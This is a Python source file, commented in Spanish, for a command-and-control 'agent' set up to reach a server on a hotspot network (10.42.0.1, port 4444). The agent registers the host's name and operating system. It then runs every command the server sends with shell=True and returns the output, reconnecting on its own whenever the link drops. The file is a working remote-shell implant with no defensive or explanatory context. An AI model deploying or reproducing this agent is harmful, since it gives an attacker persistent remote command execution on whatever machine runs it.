"""
Agente C2 - Versión para RED (Hotspot)
CONFIGURADO PARA: Conectarse al servidor via hotspot
"""

import socket
import json
import subprocess
import platform
import uuid
import time

# ============================================
# CONFIGURACIÓN PARA RED HOTSPOT
# ============================================
SERVER_HOST = "10.42.0.1"  # IP típica de hotspot en Linux
SERVER_PORT = 4444
AGENT_ID = "agent-" + str(uuid.uuid4())[:6]

RECONNECT_DELAY = 5  # segundos antes de reintentar si se cae la conexión


def send_json(sock, data: dict):
    msg = json.dumps(data) + "\n"
    sock.sendall(msg.encode())


def recv_json(sock, buffer: str):
    while "\n" not in buffer:
        chunk = sock.recv(4096)
        if not chunk:
            return None, buffer
        buffer += chunk.decode(errors="ignore")
    line, buffer = buffer.split("\n", 1)
    if not line.strip():
        return {}, buffer
    return json.loads(line), buffer


def execute_command(command: str) -> str:
    """Ejecuta un comando del sistema y captura su salida."""
    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=30,
        )
        output = result.stdout if result.stdout else result.stderr
        return output.strip() or "(sin salida)"
    except subprocess.TimeoutExpired:
        return "(error) comando excedió el tiempo límite"
    except Exception as e:
        return f"(error) {e}"


def run_agent():
    print(f"[*] Intentando conectar a {SERVER_HOST}:{SERVER_PORT}")
    while True:  # loop de reconexión
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((SERVER_HOST, SERVER_PORT))
            print(f"[+] Conectado al servidor como {AGENT_ID}")

            # Registro inicial
            send_json(sock, {
                "type": "hello",
                "agent_id": AGENT_ID,
                "hostname": platform.node(),
                "os": platform.system(),
            })

            buffer = ""
            while True:
                msg, buffer = recv_json(sock, buffer)
                if msg is None:
                    print("[!] Servidor cerró la conexión")
                    break
                if msg.get("type") == "cmd":
                    cmd = msg.get("command")
                    msg_id = msg.get("id")
                    print(f"[cmd recibido] id={msg_id}: {cmd}")
                    output = execute_command(cmd)
                    send_json(sock, {
                        "type": "result",
                        "id": msg_id,
                        "agent_id": AGENT_ID,
                        "output": output,
                        "status": "ok",
                    })

        except (ConnectionRefusedError, ConnectionResetError, OSError) as e:
            print(f"[!] No se pudo conectar/se perdió conexión: {e}")
            print(f"[*] Reintentando en {RECONNECT_DELAY}s...")
            time.sleep(RECONNECT_DELAY)


if __name__ == "__main__":
    run_agent()
